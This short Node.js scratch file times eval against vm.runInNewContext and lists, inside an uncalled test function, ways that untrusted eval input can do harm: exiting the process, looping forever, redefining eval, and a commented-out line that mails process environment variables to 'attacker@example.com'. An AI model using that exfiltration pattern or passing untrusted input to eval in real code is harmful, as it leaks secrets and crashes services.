import * as vm from "vm";
function test() {
  eval("process.exit(1)");
  eval("while(true) console.log(1)");
  // eval(
  //   'require("node-mailer").mail("attacker@example.com", JSON.stringify(process.ENV))'
  // );

  // re-define the eval, causing next execution to crash
  eval("eval = undefined");
}

// test();

console.time("r");
vm.runInNewContext("1 + 1", {});
console.timeEnd("r");
// 2.219ms

console.time("e");
eval("1+1");
console.timeEnd("e");
// 0.021ms
